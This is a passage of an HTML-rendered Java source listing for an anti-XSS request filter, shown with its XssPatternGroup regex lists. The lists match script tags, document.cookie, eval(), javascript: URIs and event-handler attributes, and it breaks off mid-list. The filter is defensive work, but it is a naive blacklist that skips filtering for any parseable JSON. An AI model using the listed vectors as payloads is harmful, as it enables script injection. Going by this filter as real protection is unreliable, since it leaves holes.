        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">patternToEmpty</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 非法请求，禁止访问</span>
            checkIllegal<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// JSON数据通过验证</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isJson</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 过滤危险字符</span>
        value <span class="token operator">=</span> <span class="token function">patternToReplace</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmpValue <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>tmpValue<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"【%s】----【%s】\n"</span><span class="token punctuation">,</span> tmpValue<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 验证是否直接清理参数内容
     *
     * @param value
     * @return
     */</span>
    <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">patternToEmpty</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Matcher</span> matcher <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span> testValue <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span><span class="token constant">ROOT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Pattern</span> pattern <span class="token operator">:</span> <span class="token class-name">XssPatternGroup</span><span class="token punctuation">.</span><span class="token constant">LIST_PATTERNS_DELETE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            matcher <span class="token operator">=</span> pattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtil</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 验证是否直接替换参数内容
     *
     * @param value
     * @return
     */</span>
    <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">patternToReplace</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Matcher</span> matcher <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Pattern</span> pattern <span class="token operator">:</span> <span class="token class-name">XssPatternGroup</span><span class="token punctuation">.</span><span class="token constant">LIST_PATTERNS_REPLACE_TO_EMPTY</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            matcher <span class="token operator">=</span> pattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 匹配</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 删除相关字符串</span>
                value <span class="token operator">=</span> matcher<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isJson</span><span class="token punctuation">(</span><span class="token class-name">String</span> json<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">boolean</span> result <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span> testJson <span class="token operator">=</span> json<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span><span class="token constant">ROOT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// JSON数据通过验证</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>testJson<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"/${"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> json<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> json<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
                result <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON数据被拦截："</span> <span class="token operator">+</span> json<span class="token punctuation">)</span><span class="token punctuation">;</span>
                result <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>safety<span class="token punctuation">.</span>util</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @author: DH
 * @date: 2022/4/20
 * @desc:
 */</span>
<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">XssPatternGroup</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Pattern</span><span class="token punctuation">&gt;</span></span> <span class="token constant">LIST_PATTERNS_DELETE</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Pattern</span><span class="token punctuation">&gt;</span></span> <span class="token constant">LIST_PATTERNS_REPLACE_TO_EMPTY</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">:</span> <span class="token function">getXssPatternToNullList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token constant">LIST_PATTERNS_DELETE</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">:</span> <span class="token function">getXssPatternToEmptyList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token constant">LIST_PATTERNS_REPLACE_TO_EMPTY</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 正则匹配上：清空参数所有内容
     *
     * @return
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> <span class="token function">getXssPatternToNullList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"&lt;(\\S*)(no)?script|&lt;/(\\S*)(no)?script|&lt;(\\S*)iframe|&lt;(\\S*)img|&lt;(\\S*)svg|&lt;(\\S*)audio|\\.html"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"window\\.location|window\\.|\\.location|document\\.cookie|document\\.write|document\\.|alert\\(.*?\\)|window\\.open\\(*"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"eval\\((.*?)\\)"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"javascript:|vbscript:|view-source:"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"( href=)|( src=)|(=wrtice\\()"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"&lt;+\\s*\\w*\\s*(oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror=|onerroupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmousout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onabort|onactivate|onafterprint|onafterupdate|onbefore|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)+\\s*=+"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 正则匹配上：清空参数匹配项
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> <span class="token function">getXssPatternToEmptyList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"expression\\((.*?)\\)"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"&lt;(\"[^\"]*\"|\'[^\']*\'|[^\'\"&gt;])*&gt;"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"&amp;.*?|$.*?|CR.*?|LF.*?|\\.*?"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"%22"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"%27"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"%3E"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"%3e"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"%3C"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"%3c"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
